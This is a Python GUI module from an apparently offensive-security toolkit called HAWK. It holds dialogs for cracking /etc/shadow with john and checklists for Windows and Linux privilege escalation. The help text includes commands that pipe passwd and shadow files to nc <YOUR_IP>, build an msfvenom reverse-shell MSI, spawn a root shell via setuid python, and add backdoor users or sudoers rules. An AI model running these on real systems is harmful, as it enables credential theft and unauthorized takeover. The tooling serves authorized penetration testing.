# HAWK — Hostile Assessment WorKit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Kill Chain Card Widget v1.0
- Port-aware routing for all tools
- Hydra: wordlist dropdown from metasploit/seclists + browse
- MSF card: check DB + guide user
- Nmap custom: free command field
- Right-click context menu on all entries
- smbclient/crackmapexec → auto-populate intel
- ssh_banner/ftp_anon port-aware fix
- No popup for 0 ports found
- WinRM excluded from HTTP tools
"""

import customtkinter as ctk
import tkinter as tk
import os
import re
import glob
import time
import subprocess
import threading
import shlex
import json
import zipfile
import tempfile
import shutil
import socket
import random
import string
import uuid
from datetime import datetime
from pathlib import Path

from utils.runner import ToolRunner, MultiRunner, MetasploitRunner, GreenBoneRunner
from utils.session import Credential
from gui.widgets.card_common import *

class CardAccessRoutesMixin:
    def _gate_check(self, tool, _skip_privesc_dialog=False,
                     _skip_winpeas_exe_preflight=False):
        # ── Dialog-only tools — intercepted BEFORE the access gate ──
        # These tools don't spawn a subprocess; they're pure HAWK
        # dialogs that work independently of whether the operator
        # has landed a shell yet.  Putting them above the access
        # gate has two effects:
        #   1. The operator can consult them speculatively (e.g.
        #      open POST-RCE RECON to copy the snippet BEFORE
        #      registering the shell as "exploited" in HAWK).
        #   2. Avoids a known bug where AccessGateDialog's PROCEED
        #      ANYWAY callback routes through `_request_run` instead
        #      of re-entering `_gate_check`, which made the dialog
        #      tools fall into the generic PermissionDialog flow
        #      (showing the dummy `echo …` cmd_template).
        if tool.id == "post_rce_recon":
            self._show_post_rce_recon_dialog(platform="linux")
            return
        if tool.id == "post_rce_recon_win":
            self._show_post_rce_recon_dialog(platform="windows")
            return
        if tool.id == "privesc_cheat":
            self._show_privesc_cheat_dialog()
            return
        if tool.id == "shadow_crack":
            self._show_shadow_crack_dialog()
            return
        if tool.id == "potato_picker":
            self._show_potato_picker_dialog()
            return

        # ── Access gate (subprocess-spawning tools only) ──
        if self.phase_id in ACCESS_GATED_PHASES and not self._has_access():
            self._show_access_gate(tool)
            return
        # winpeas.exe smart preflight — shown on EVERY click (user
        # asked: "due volte bastano").  Picks the right variant of
        # the 7 PEASS-ng winPEAS builds based on OS fingerprint +
        # arch + AV hints, but always lets the operator override.
        # Skipped when the preflight itself re-enters _gate_check
        # with the variant already locked in.
        if (tool.id == "winpeas_exe"
                and not _skip_winpeas_exe_preflight):
            self._show_winpeas_exe_preflight(tool)
            return
        # Windows privesc "Choose approach" dialog — shown ONLY when
        # the user clicks the generic `winpeas` entry-point card (the
        # one labelled "WINPEAS (download)"), which is meant as a
        # "which variant do I want?" funnel.  All other privesc cards
        # (winpeas.exe, PrivescCheck.ps1, PowerUp, Token Privileges,
        # etc.) are specific tools — clicking them means "run exactly
        # this one" and should skip the picker entirely.  Previously
        # the whole _WIN_PRIVESC_IDS set triggered the picker, which
        # made every card feel like a detour through the same dialog.
        if not _skip_privesc_dialog:
            if tool.id == "winpeas" and getattr(
                    tool, "os_hint", "any") == "windows":
                self._show_windows_privesc_context(tool)
                return
            # Linux mirror: the `linpeas` card is the generic entry
            # point that opens a picker for linpeas.sh / lse.sh /
            # pspy / manual commands.  All other Linux privesc cards
            # (lse, pspy directly) skip the picker and run straight.
            if tool.id == "linpeas" and getattr(
                    tool, "os_hint", "any") == "linux":
                self._show_linux_privesc_context(tool)
                return
        self._request_run(tool)

    def _show_potato_picker_dialog(self):
        """Open the Potato variant picker dialog.  The dialog handles
        OS-based auto-recommendation, binary download to /tmp, and
        generation of the ready-to-paste execution command."""
        try:
            from gui.dialogs import show_potato_picker_dialog
            show_potato_picker_dialog(self, self.app)
        except Exception as e:
            print(f"[HAWK] potato picker dialog failed: {e}")
            try:
                self.app.terminal.write(
                    f"  [!] Potato picker failed to open: {e}",
                    "error")
            except Exception:
                pass

    def _show_shadow_crack_dialog(self):
        from gui.dialogs import (_make_win, _title, _sub,
                                  _btn_row, _btn, _safe_destroy)
        import tempfile
        import os
        import subprocess
        import threading

        target = ""
        try:
            sess = self.app.session_manager.current
            target = sess.target_ip if sess else ""
        except Exception:
            pass

        win = _make_win(self, "Shadow Crack — john", 760, 740)
        _title(win, "SHADOW CRACK  —  /etc/passwd + /etc/shadow → john")
        _sub(win, "Paste the file contents from the target shell",
             COLORS["text_dim"])

        info = ctk.CTkFrame(
            win, fg_color=COLORS["bg_card"],
            border_color=COLORS["border_green"],
            border_width=2, corner_radius=4)
        info.pack(fill="x", padx=14, pady=(6, 8))
        ctk.CTkLabel(
            info, text="  ⓘ  How to extract from target",
            font=_f("md", True), text_color=COLORS["text_green"],
            anchor="w").pack(fill="x", padx=10, pady=(8, 2))
        cmds_box = ctk.CTkTextbox(
            info, height=130, font=_f("sm"),
            fg_color=COLORS["bg_secondary"],
            text_color=COLORS["text_bright"],
            border_width=0, corner_radius=3, wrap="none")
        cmds_box.pack(fill="x", padx=12, pady=(0, 8))
        cmds_text = (
            "# 1. passwd — always readable\n"
            "cat /etc/passwd\n\n"
            "# 2. shadow — needs root\n"
            "cat /etc/shadow\n"
            "sudo cat /etc/shadow\n\n"
            "# Alternative: base64 encode (avoids copy/paste issues)\n"
            "base64 /etc/passwd        # decode on Kali: base64 -d\n"
            "sudo base64 /etc/shadow\n\n"
            "# Alternative: if netcat available, exfil over network\n"
            "cat /etc/passwd | nc <YOUR_IP> 4444\n"
            "sudo cat /etc/shadow | nc <YOUR_IP> 4445\n\n"
            "# If you have meterpreter:\n"
            "download /etc/passwd /tmp/passwd\n"
            "download /etc/shadow /tmp/shadow"
        )
        cmds_box.insert("1.0", cmds_text)
        cmds_box.configure(state="disabled")

        ctk.CTkLabel(win, text="/etc/passwd:",
                     font=_f("md", True), text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=14, pady=(4, 2))
        passwd_box = ctk.CTkTextbox(
            win, height=140, font=_f("sm"),
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"],
            border_width=1, corner_radius=3)
        passwd_box.pack(fill="x", padx=14, pady=(0, 6))

        ctk.CTkLabel(win, text="/etc/shadow:",
                     font=_f("md", True), text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=14, pady=(4, 2))
        shadow_box = ctk.CTkTextbox(
            win, height=140, font=_f("sm"),
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"],
            border_width=1, corner_radius=3)
        shadow_box.pack(fill="x", padx=14, pady=(0, 6))

        warn_lbl = ctk.CTkLabel(
            win, text="", font=_f("sm"),
            text_color=COLORS["text_yellow"], anchor="w")
        warn_lbl.pack(fill="x", padx=14, pady=(0, 4))

        def _run_crack():
            passwd_text = passwd_box.get("1.0", "end").strip()
            shadow_text = shadow_box.get("1.0", "end").strip()

            if not passwd_text:
                warn_lbl.configure(text="⚠  Paste /etc/passwd content first")
                return
            if not shadow_text:
                warn_lbl.configure(text="⚠  Paste /etc/shadow content first")
                return

            passwd_lines = [l for l in passwd_text.splitlines() if ":" in l]
            shadow_lines = [l for l in shadow_text.splitlines() if ":" in l]
            if not passwd_lines:
                warn_lbl.configure(text="⚠  No valid passwd lines found")
                return
            if not shadow_lines:
                warn_lbl.configure(text="⚠  No valid shadow lines found")
                return

            _safe_destroy(win)
            threading.Thread(
                target=self._shadow_crack_worker,
                args=(passwd_text, shadow_text, target),
                daemon=True).start()

        row = _btn_row(win)
        _btn(row, "CRACK", _run_crack, primary=True, w=140)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))

    def _shadow_crack_worker(self, passwd_text, shadow_text, target):
        import tempfile
        import os
        import subprocess
        import re

        term = self.app.terminal
        _w = lambda msg, lvl="info": term.write(msg, lvl)

        os.makedirs(TMP_DIR, exist_ok=True)
        tmp_dir = tempfile.mkdtemp(prefix="hawk_shadow_", dir=TMP_DIR)
        passwd_path = os.path.join(tmp_dir, "passwd")
        shadow_path = os.path.join(tmp_dir, "shadow")
        combined_path = os.path.join(tmp_dir, "unshadowed")

        try:
            with open(passwd_path, "w") as f:
                f.write(passwd_text + "\n")
            with open(shadow_path, "w") as f:
                f.write(shadow_text + "\n")

            _w("  [SHADOW CRACK] files saved, running unshadow...", "info")

            r = subprocess.run(
                ["unshadow", passwd_path, shadow_path],
                capture_output=True, text=True, timeout=30,
                errors="replace")

            if r.returncode != 0:
                _w(f"  [!] unshadow failed: {r.stderr.strip()}", "error")
                return

            combined = r.stdout.strip()
            if not combined:
                _w("  [!] unshadow produced empty output", "error")
                return

            with open(combined_path, "w") as f:
                f.write(combined + "\n")

            _w(f"  [SHADOW CRACK] unshadow OK — "
               f"{len(combined.splitlines())} entries", "info")

            rockyou = "/usr/share/wordlists/rockyou.txt"
            if not os.path.isfile(rockyou):
                _w("  [!] rockyou.txt not found — "
                   "run: sudo gunzip /usr/share/wordlists/rockyou.txt.gz",
                   "error")
                return

            import uuid
            sess_id = uuid.uuid4().hex[:8]
            sess_dir = os.path.join(TMP_DIR, "john")
            os.makedirs(sess_dir, exist_ok=True)
            sess_path = os.path.join(sess_dir, f"hawk_shadow_{sess_id}")
            pot_path = sess_path + ".pot"

            _w("  [SHADOW CRACK] john --wordlist=rockyou.txt ...", "info")

            proc = subprocess.Popen(
                ["john", f"--session={sess_path}",
                 f"--pot={pot_path}",
                 f"--wordlist={rockyou}",
                 combined_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True, bufsize=1, errors="replace")

            for line in proc.stdout:
                line = line.rstrip()
                if line:
                    _w(f"  [JOHN] {line}", "info")
            proc.wait(timeout=3600)

            _w(f"  [SHADOW CRACK] john finished (rc={proc.returncode})",
               "info")

            show_r = subprocess.run(
                ["john", "--show", f"--pot={pot_path}", combined_path],
                capture_output=True, text=True, timeout=30,
                errors="replace")

            cracked_count = 0
            cracked_list = []
            for line in (show_r.stdout or "").splitlines():
                if ":" in line and not line.startswith("0 password"):
                    m = re.match(r"^([^:]+):([^:]+):", line)
                    if m and not line.endswith("password hashes cracked"):
                        user = m.group(1)
                        pw = m.group(2)
                        if pw and pw not in ("*", "!", "x"):
                            cracked_list.append((user, pw))
                            cracked_count += 1

            total_match = re.search(
                r"(\d+) password hash(?:es)? cracked",
                show_r.stdout or "")
            if total_match:
                cracked_count = max(cracked_count, int(total_match.group(1)))

            shadow_hashes = {}
            for line in shadow_text.splitlines():
                parts = line.split(":")
                if len(parts) >= 2 and parts[1] and parts[1] not in (
                        "*", "!", "!!", "x", ""):
                    shadow_hashes[parts[0]] = parts[1]

            if cracked_list:
                _w(f"\n  [SHADOW CRACK] ✓ {len(cracked_list)} "
                   f"password(s) cracked!", "success")
                for user, pw in cracked_list:
                    _w(f"    {user} : {pw}", "success")
                self._shadow_save_credentials(
                    cracked_list, shadow_hashes, target)
            else:
                _w("  [SHADOW CRACK] no passwords cracked with rockyou.",
                   "warn")

        except subprocess.TimeoutExpired:
            _w("  [!] john timed out (1 hour limit)", "warn")
        except FileNotFoundError as e:
            _w(f"  [!] binary not found: {e}", "error")
        except Exception as e:
            _w(f"  [!] shadow crack error: {e}", "error")
        finally:
            import shutil
            try:
                shutil.rmtree(tmp_dir, ignore_errors=True)
            except Exception:
                pass
            for ext in (".rec", ".log", ".pot"):
                try:
                    os.unlink(sess_path + ext)
                except Exception:
                    pass

    def _shadow_save_credentials(self, cracked_list, shadow_hashes,
                                  target):
        from utils.session import Credential
        try:
            sess = self.app.session_manager.current
            if not sess:
                return
            for user, pw in cracked_list:
                h = shadow_hashes.get(user, "")
                cred = Credential(
                    username=user,
                    password=pw,
                    hash_val=h,
                    cred_type="cleartext",
                    services=["SSH", "system"],
                    source_phase="post_exploit",
                    host=target,
                    notes="Cracked from /etc/shadow via john",
                )
                if h:
                    cred.cracked = True
                    cred.cracked_pass = pw
                sess.add_credential(cred)
            self.app.terminal.write(
                f"  [SHADOW CRACK] {len(cracked_list)} credential(s) "
                f"saved to Credential Store", "success")
            try:
                self.app.cred_store.refresh()
            except Exception:
                pass
        except Exception as e:
            self.app.terminal.write(
                f"  [!] Failed to save credentials: {e}", "error")

    def _show_winpeas_exe_preflight(self, tool):
        """Open the winPEAS.exe smart preflight picker.  The dialog
        reads the Target Intel fingerprint + auto-findings, picks
        the best of the 7 PEASS-ng variants (.x64 / .x86 / .any
        each with an _ofs obfuscated twin, plus the .ps1 port), and
        lets the user pick any of them.  Whatever the user picks,
        we override the `winpeas_exe` tool's cmd_template at runtime
        so the normal download → PEAS Workflow flow then picks up
        the right binary with the right local filename.

        The `.bat` variant is NOT a choice here — .bat has its own
        WINPEAS (download) card with its own workflow.  If the
        target is legacy Windows where no .exe variant fits, the
        preflight dialog nudges the user towards that other card
        but still lets them force an .exe variant."""
        try:
            from gui.dialogs import show_winpeas_exe_preflight_dialog

            def _on_variant(variant: dict):
                # Remember the variant so _open_peas_workflow can
                # surface the right script_name (winpeas.exe vs
                # winpeas.ps1) after the download completes.
                self._winpeas_exe_chosen_variant = variant
                # Rewrite the tool's curl to fetch the CHOSEN URL
                # and save with the matching local name
                # (winpeas.exe for the 6 exe variants, winpeas.ps1
                # for the PowerShell port).
                try:
                    tool.cmd_template = (
                        f"curl -L {variant['url']} "
                        f"-o {variant['local_name']}")
                except Exception as e:
                    print(f"[HAWK] winpeas_exe cmd override "
                          f"failed: {e}")
                    return
                try:
                    self.app.terminal.write(
                        f"  [*] winPEAS preflight → "
                        f"{variant['name']}  ({variant['runtime']}, "
                        f"arch:{variant['arch']}"
                        + (", obfuscated" if variant['obfuscated']
                           else "") + ")", "dim")
                except Exception:
                    pass
                # Re-enter _gate_check with the preflight skipped
                # so we go through the normal privesc-dialog path
                # (AV/EDR context etc).  The tool.id is still
                # "winpeas_exe" so existing routing continues to
                # fire on it.
                self._gate_check(
                    tool, _skip_winpeas_exe_preflight=True)

            show_winpeas_exe_preflight_dialog(
                self, self.app, _on_variant)
        except Exception as e:
            print(f"[HAWK] winpeas exe preflight failed: {e}")
            try:
                self.app.terminal.write(
                    f"  [!] winPEAS preflight failed to open: {e}",
                    "error")
            except Exception:
                pass
            # Fallback — preflight broken, run the vanilla tool so
            # at least the user can still download winPEASany.exe.
            self._gate_check(
                tool, _skip_winpeas_exe_preflight=True)

    def _has_access(self) -> bool:
        # Once the operator clicks PROCEED ANYWAY on the access
        # gate, we set this flag so re-entering _gate_check (with
        # the same tool) doesn't loop back into the gate dialog.
        # The flag is per-card, per-session: a fresh KillChainCard
        # starts without it, and `clear` of the session resets it
        # along with the rest of the card state.
        if getattr(self, "_access_override", False):
            return True
        session = self.app.session_manager.current
        if not session:
            return False
        if session.phases.get("exploitation", {}).get("status") == "done":
            return True
        if session.credentials:
            return True
        return False

    def _show_access_gate(self, tool=None):
        """Show the 'no access to target' gate.

        ``tool`` is the tool the user clicked.  If supplied, PROCEED
        ANYWAY re-enters ``_gate_check`` with the SAME tool so all
        tool-specific dispatchers (privesc dialogs, winpeas preflight,
        impacket auth, etc.) still fire correctly.  The previous
        implementation called ``_request_run(get_tools()[0])`` which
        always ran the FIRST tool of the module via the generic path,
        bypassing the entire dispatch tree — that's how POST-RCE
        RECON ended up in the PermissionDialog "Run echo …?" flow.
        """
        from gui.dialogs import AccessGateDialog

        def _go_exploit():
            card = self.app.kill_chain_panel.get_card("exploitation")
            if card and not card._expanded:
                card._toggle_expand()

        def _proceed():
            target_tool = tool
            if target_tool is None:
                tools = self.module.get_tools()
                target_tool = tools[0] if tools else None
            if target_tool is None:
                return
            # Mark access as granted for this session so re-entering
            # _gate_check doesn't loop back into the access gate.
            try:
                self._access_override = True
            except Exception:
                pass
            self._gate_check(target_tool)

        AccessGateDialog(
            self, phase_name=self.phase_config["name"],
            callback_go_exploit=_go_exploit,
            callback_add_creds=lambda: None,
            callback_proceed=_proceed,
        )

    def _show_windows_privesc_context(self, tool):
        """Show AV/EDR context dialog before launching any Windows privesc tool.
        After the user picks their tool, routes to the appropriate workflow."""
        try:
            from gui.dialogs import show_windows_privesc_context_dialog

            def _on_selected(tool_id):
                # Map the chosen tool_id to the actual module tool
                # If user picked a different tool than what they clicked, find it
                if tool_id == "manual":
                    self._show_manual_privesc_checklist()
                    return
                # Map the dialog's tool_id to the real module tool id.
                # winpeas_bat and winpeas_exe are NOW distinct tools
                # (see modules/post_exploit.py): the .bat is the
                # original batch script, the .exe is the compiled
                # winPEASany binary — faster but flagged by any AV.
                tool_map = {
                    "winpeas_bat":   "winpeas",
                    "winpeas_exe":   "winpeas_exe",
                    "privesc_check": "privesc_check",
                }
                actual_id = tool_map.get(tool_id, tool.id)
                actual_tool = self.module.get_tool(actual_id)
                if actual_tool is None:
                    actual_tool = tool
                self._gate_check(actual_tool, _skip_privesc_dialog=True)

            show_windows_privesc_context_dialog(self, self.app, _on_selected)
        except Exception as e:
            print(f"[HAWK] privesc context dialog failed: {e}")
            # Fallback: run directly
            self._gate_check(tool, _skip_privesc_dialog=True)

    def _show_linux_privesc_context(self, tool):
        """Mirror of _show_windows_privesc_context for Linux targets.
        Opens the linpeas/lse/pspy/manual picker and, on selection,
        routes to the correct module tool (which then triggers the
        PEAS Workflow dialog with OS-appropriate command sets)."""
        try:
            from gui.dialogs import show_linux_privesc_context_dialog

            def _on_selected(tool_id):
                if tool_id == "manual":
                    self._show_manual_linux_privesc_checklist()
                    return
                # The Linux picker tool ids already match the module
                # tool ids 1:1 (linpeas / lse / pspy).  Resolve to
                # the actual Tool object and re-enter _gate_check
                # with the picker dialog skipped so we go straight
                # to _request_run → download → PEAS Workflow dialog.
                actual_tool = self.module.get_tool(tool_id) or tool
                self._gate_check(
                    actual_tool, _skip_privesc_dialog=True)

            show_linux_privesc_context_dialog(
                self, self.app, _on_selected)
        except Exception as e:
            print(f"[HAWK] linux privesc context dialog failed: {e}")
            self._gate_check(tool, _skip_privesc_dialog=True)

    def _show_manual_privesc_checklist(self):
        """Show a curated checklist of manual Windows privesc commands for stealth ops."""
        from gui.dialogs import _make_win, _safe_destroy, _btn_row, _btn
        import tkinter as tk

        target = self._get_target() or "TARGET"
        win = _make_win(self, "Manual Windows Privesc Checklist", 860, 700)

        ctk.CTkLabel(win,
                     text="🎯  MANUAL PRIVESC CHECKLIST — Zero footprint, maximum stealth",
                     font=_f("lg", True),
                     text_color=COLORS.get("text_cyan", "#7EC8E3"),
                     anchor="w").pack(fill="x", padx=16, pady=(12, 4))

        ctk.CTkLabel(win,
                     text="Run these commands individually in the target shell. Each one is a native Windows command — no script, no binary transfer needed.",
                     font=_f("sm"), text_color=COLORS["text_dim"],
                     anchor="w", wraplength=800, justify="left").pack(fill="x", padx=16, pady=(0, 8))

        scroll = ctk.CTkScrollableFrame(win, fg_color=COLORS["bg_secondary"],
                                         scrollbar_button_color=COLORS["border_dim"])
        scroll.pack(fill="both", expand=True, padx=16, pady=(0, 4))

        CHECKLIST = [
            ("🔴 TOKENS — Potato attack vectors", [
                ("whoami /priv",
                 "List token privileges. Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege. Any of these = likely privesc path via Potato (JuicyPotato, PrintSpoofer, GodPotato)."),
                ("whoami /groups",
                 "List group memberships. BUILTIN\\Administrators = already elevated. NT AUTHORITY\\SYSTEM = fully owned."),
            ]),
            ("🔴 REGISTRY — AlwaysInstallElevated (MSI privesc)", [
                ("reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                 "If this returns 0x1 AND the HKCU key below is also 0x1, you can install a malicious .msi as SYSTEM."),
                ("reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                 "BOTH keys must be 0x1. If so: msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > evil.msi && msiexec /quiet /qn /i evil.msi"),
            ]),
            ("🟡 SERVICES — Unquoted paths and weak permissions", [
                ('wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v \'""\'',
                 "Find services with unquoted paths containing spaces. Example: C:\\Program Files\\My App\\service.exe — you can drop a binary at C:\\Program.exe or C:\\Program Files\\My.exe and it runs as SYSTEM on next restart."),
                ("sc qc <service_name>",
                 "Check a specific service config. Look at BINARY_PATH_NAME and SERVICE_START_NAME. If START_NAME is LocalSystem and path is writable — instant privesc."),
                ("icacls \"C:\\path\\to\\service.exe\"",
                 "Check if you can write to the service binary. If yes: replace it with a reverse shell, then sc stop/start the service."),
            ]),
            ("🟡 SCHEDULED TASKS — Writable task paths", [
                ('schtasks /query /fo LIST /v | findstr /i "TaskName\\|Run As User\\|Task To Run\\|Status"',
                 "Look for tasks running as SYSTEM or Administrator with a path you can write to. If you can replace the executable, you get SYSTEM on next scheduled run."),
            ]),
            ("🟡 AUTORUNS — Persistence and hijack opportunities", [
                ("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                 "Programs that auto-start as SYSTEM on boot. If any path is writable by your user, replace the binary."),
                ("reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                 "User-level autoruns. Less useful for privesc but useful for persistence."),
            ]),
            ("🟢 USERS & GROUPS", [
                ("net user",
                 "List all local users. Look for disabled accounts (might be re-enableable), accounts with no password expiry."),
                ("net localgroup administrators",
                 "Who has admin rights? If your user is here, you might just need to spawn an elevated process."),
                ("net user <username>",
                 "Detailed info on a specific user — last logon, password policy, group memberships."),
            ]),
            ("🟢 NETWORK — Internal services and pivoting", [
                ("netstat -ano",
                 "All active connections and listening ports. Look for ports only listening on 127.0.0.1 — internal services unreachable from outside. Forward them back with netsh or chisel."),
                ("netstat -ano | findstr LISTENING",
                 "Filter to just listening ports. Compare with nmap results — anything here that wasn't in your external scan = internal service ripe for pivoting."),
            ]),
            ("🔵 CREDENTIALS — Quick wins", [
                ("cmdkey /list",
                 "List saved credentials in Windows Credential Manager. If Administrator or domain creds are saved, you can use runas /savecred to run commands as that user."),
                ('reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password"',
                 "Search the entire HKLM hive for registry keys containing 'password'. Noisy but finds a lot — apps, VPN configs, service accounts."),
                ('dir /s /b C:\\*.config 2>nul | findstr /i "web.config\\|app.config"',
                 "Find web.config and app.config files — often contain database passwords in cleartext."),
                ("type C:\\Windows\\System32\\drivers\\etc\\hosts",
                 "Check hosts file for internal hostnames — reveals internal network structure."),
            ]),
        ]

        for section_title, commands in CHECKLIST:
            sec_fr = ctk.CTkFrame(scroll, fg_color=COLORS["bg_card"],
                                   corner_radius=4, border_color=COLORS["border_dim"],
                                   border_width=1)
            sec_fr.pack(fill="x", padx=4, pady=(6, 0))
            ctk.CTkLabel(sec_fr, text=f"  {section_title}",
                         font=_f("sm", True), text_color=COLORS["text_bright"],
                         anchor="w").pack(fill="x", padx=8, pady=(6, 2))

            for cmd, explanation in commands:
                cmd_fr = ctk.CTkFrame(sec_fr, fg_color=COLORS["bg_secondary"],
                                       corner_radius=3)
                cmd_fr.pack(fill="x", padx=6, pady=2)

                top = ctk.CTkFrame(cmd_fr, fg_color="transparent")
                top.pack(fill="x", padx=6, pady=(4, 0))

                cmd_box = ctk.CTkTextbox(top, height=28, font=("Courier", 11),
                                          fg_color=COLORS["bg_card"],
                                          text_color=COLORS["text_bright"],
                                          border_color=COLORS["border_dim"],
                                          border_width=1, corner_radius=3, wrap="none")
                cmd_box.pack(side="left", fill="x", expand=True, padx=(0, 6))
                cmd_box.insert("1.0", cmd)
                cmd_box.configure(state="disabled")
                # Cede the mouse wheel to the surrounding scrollable
                # frame — without this, hovering over a cmd textbox
                # traps the wheel inside its 28-px single line and the
                # outer checklist won't scroll.  HAWK's global wheel
                # handler checks this attribute via
                # utils.mousewheel._has_bubble_flag.
                cmd_box._hawk_bubble_wheel = True
                try:
                    cmd_box._textbox._hawk_bubble_wheel = True
                except Exception:
                    pass

                def _copy_cmd(c=cmd):
                    try:
                        win.clipboard_clear()
                        win.clipboard_append(c)
                    except Exception:
                        pass

                ctk.CTkButton(top, text="COPY", width=60, height=26,
                              font=_f("sm", True),
                              fg_color=COLORS["bg_card"],
                              hover_color=COLORS["bg_card_hover"],
                              border_color=COLORS["border_green"], border_width=1,
                              text_color=COLORS["text_green"], corner_radius=3,
                              command=_copy_cmd).pack(side="left")

                ctk.CTkLabel(cmd_fr, text=f"  {explanation}",
                             font=_f("xs"), text_color=COLORS["text_muted"],
                             anchor="w", wraplength=780, justify="left"
                             ).pack(fill="x", padx=8, pady=(2, 6))

        row = _btn_row(win)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), primary=True)

    def _show_manual_linux_privesc_checklist(self):
        """Manual Linux privesc checklist — mirror of the Windows one.
        Same scrollable layout, same COPY button pattern, same
        _hawk_bubble_wheel trick so the mouse wheel scrolls the outer
        frame instead of getting trapped in the per-command textbox."""
        from gui.dialogs import _make_win, _safe_destroy, _btn_row, _btn

        target = self._get_target() or "TARGET"
        win = _make_win(
            self, "Manual Linux Privesc Checklist", 900, 720)

        ctk.CTkLabel(
            win,
            text="🎯  MANUAL LINUX PRIVESC CHECKLIST — "
                 "Zero footprint, maximum stealth",
            font=_f("lg", True),
            text_color=COLORS.get("text_cyan", "#7EC8E3"),
            anchor="w").pack(fill="x", padx=16, pady=(12, 4))

        ctk.CTkLabel(
            win,
            text=("Run these commands individually in the target "
                  "shell.  Each one is a native Linux/POSIX command — "
                  "no script, no download, no daemon.  Use on AuditD "
                  "or EDR-hardened hosts where a bash script would "
                  "trigger every rule."),
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="w", wraplength=840,
            justify="left").pack(fill="x", padx=16, pady=(0, 8))

        scroll = ctk.CTkScrollableFrame(
            win, fg_color=COLORS["bg_secondary"],
            scrollbar_button_color=COLORS["border_dim"])
        scroll.pack(fill="both", expand=True, padx=16, pady=(0, 4))

        # Curated Linux privesc checklist — roughly parallel to the
        # Windows one.  Severity colour coding in the section title
        # (🔴 critical, 🟡 interesting, 🟢 baseline, 🔵 credentials).
        CHECKLIST = [
            ("🔴  KERNEL & DISTRO — identify known-CVE escapes", [
                ("uname -a",
                 "Kernel version + arch + build date.  Cross-reference "
                 "with searchsploit / exploit-db for kernel exploits. "
                 "Dirty Pipe (<5.17), DirtyCOW (<4.8.3), OverlayFS "
                 "(<5.11) are the most famous — all still present on "
                 "old LTS boxes."),
                ("cat /etc/os-release 2>/dev/null || "
                 "cat /etc/issue /etc/*-release 2>/dev/null",
                 "Distro name + version.  Old Ubuntu 16.04 / CentOS 7 "
                 "are still common in enterprise and often unpatched."),
                ("dpkg -l 2>/dev/null | head -30 || "
                 "rpm -qa 2>/dev/null | head -30",
                 "Quick peek at installed packages.  Look for old "
                 "sudo (pre-1.8.28 → CVE-2019-14287), old polkit "
                 "(pre-0.118 → CVE-2021-3560 / pwnkit)."),
            ]),
            ("🔴  SUDO — rules, tokens, version-specific bugs", [
                ("sudo -l 2>/dev/null",
                 "List YOUR sudo rules.  NOPASSWD entries = direct "
                 "privesc path (check each binary on gtfobins.github.io). "
                 "Wildcards = likely argument injection.  "
                 "!authenticate = password not needed at all."),
                ("sudo -V 2>/dev/null | head -1",
                 "Sudo version.  < 1.8.28 → CVE-2019-14287 "
                 "(sudo -u#-1).  < 1.9.5p2 → CVE-2021-3156 "
                 "(Baron Samedit, pwfeedback heap overflow → root)."),
                ("grep -r 'NOPASSWD\\|!authenticate' "
                 "/etc/sudoers /etc/sudoers.d/ 2>/dev/null",
                 "See all NOPASSWD / !authenticate rules, not just "
                 "yours — sometimes you can abuse OTHER users' "
                 "sudo config if you can become them first."),
            ]),
            ("🔴  SUID / SGID BINARIES — GTFOBins", [
                ("find / -perm -u=s -type f 2>/dev/null",
                 "All SUID binaries.  Cross-reference each with "
                 "gtfobins.github.io — find, vim, less, tar, nmap, "
                 "python, perl, awk, env, tee, cp, mv, chmod, "
                 "systemctl, dd, socat are all root in one line if "
                 "they're SUID."),
                ("find / -perm -g=s -type f 2>/dev/null",
                 "SGID binaries.  Less common vector but same idea — "
                 "if a binary is SGID to a privileged group and has "
                 "a GTFOBins entry, you can pivot into that group."),
                ("getcap -r / 2>/dev/null",
                 "File capabilities (finer-grained than SUID).  "
                 "cap_setuid+ep on /usr/bin/python3 = "
                 "`python3 -c 'import os; os.setuid(0); os.system(\"bash\")'`.  "
                 "cap_dac_read_search = read /etc/shadow without root."),
            ]),
            ("🔴  WRITABLE CRITICAL FILES — instant root", [
                ("ls -la /etc/passwd /etc/shadow /etc/sudoers "
                 "/etc/sudoers.d 2>/dev/null",
                 "Check ownership + perms.  Any of these world-"
                 "writable = game over.  /etc/passwd writable → add "
                 "a uid=0 user with `openssl passwd -1`.  /etc/sudoers "
                 "writable → add `<you> ALL=(ALL) NOPASSWD: ALL`."),
                ("find / -writable -type f -not -path '/proc/*' "
                 "-not -path '/sys/*' 2>/dev/null | head -50",
                 "All user-writable files on the filesystem (first "
                 "50).  Look for anything in /etc, /usr/local, "
                 "/opt — these are often scripts that cron or "
                 "services run as root."),
            ]),
            ("🟡  CRON — persistent RCE via path / wildcard abuse", [
                ("cat /etc/crontab /etc/cron.d/* 2>/dev/null",
                 "System-wide cron jobs.  Any script path here that "
                 "you can write to = persistent RCE as whoever owns "
                 "the cron (usually root on /etc/crontab)."),
                ("ls -la /etc/cron.hourly /etc/cron.daily "
                 "/etc/cron.weekly /etc/cron.monthly 2>/dev/null",
                 "Periodic cron directories.  Check if any files "
                 "inside are world-writable — drop a backdoor, wait."),
